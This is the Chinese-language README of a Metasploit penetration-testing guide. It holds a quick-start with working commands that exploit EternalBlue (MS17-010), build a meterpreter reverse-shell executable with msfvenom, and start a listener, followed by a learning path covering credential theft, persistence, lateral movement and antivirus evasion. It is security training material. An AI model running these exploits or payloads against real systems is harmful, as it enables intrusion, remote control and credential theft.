# Metasploit 使用指南

> Metasploit Framework（MSF）是最强大的渗透测试框架，集成了漏洞利用、Payload 生成、后渗透、内网渗透等功能，是安全从业者的必备利器。

---

## 文件结构

| 文件/目录 | 说明 |
|----------|------|
| [Metasploit使用指南.md](./Metasploit使用指南.md) | 完整使用指南（原始详细文档） |
| [01-常用命令速查表.md](./01-常用命令速查表.md) | 常用命令/模块/Payload/MSFvenom 速查表 |
| [02-实战使用场景示例.md](./02-实战使用场景示例.md) | 9 种实战场景的完整操作流程 |
| [03-高级技巧和绕过技术.md](./03-高级技巧和绕过技术.md) | 免杀技术/内网渗透/自动化/模块开发 |
| [04-常见问题与解决方案.md](./04-常见问题与解决方案.md) | 25 个常见问题及详细解决方案 |

---

## 快速开始

```bash
# 启动 MSF
msfconsole -q

# 搜索模块
search ms17-010

# 使用模块
use exploit/windows/smb/ms17_010_eternalblue

# 设置参数
set RHOSTS 192.168.1.100
set LHOST 192.168.1.1
set LPORT 4444

# 运行
run

# 生成 Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o shell.exe

# 监听会话
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j
```

---

## 学习路径建议

```
第一阶段：基础操作
  ├─ MSFconsole 常用命令
  ├─ 模块搜索与使用
  ├─ Payload 基础
  └─ Meterpreter 基础命令

第二阶段：漏洞利用
  ├─ 常见漏洞利用（MS17-010、Struts2 等）
  ├─ msfvenom Payload 生成
  ├─ Handler 监听
  └─ 多种 Payload 类型对比

第三阶段：后渗透
  ├─ 信息收集模块
  ├─ 凭证窃取（Mimikatz）
  ├─ 权限提升
  └─ 持久化技术

第四阶段：内网渗透
  ├─ 路由与端口转发
  ├─ SOCKS 代理
  ├─ 横向移动（Psexec/WMI/WinRM）
  └─ 域渗透基础

第五阶段：高级技巧
  ├─ 免杀技术
  ├─ 自动化脚本
  ├─ 数据库使用
  └─ 模块开发
```
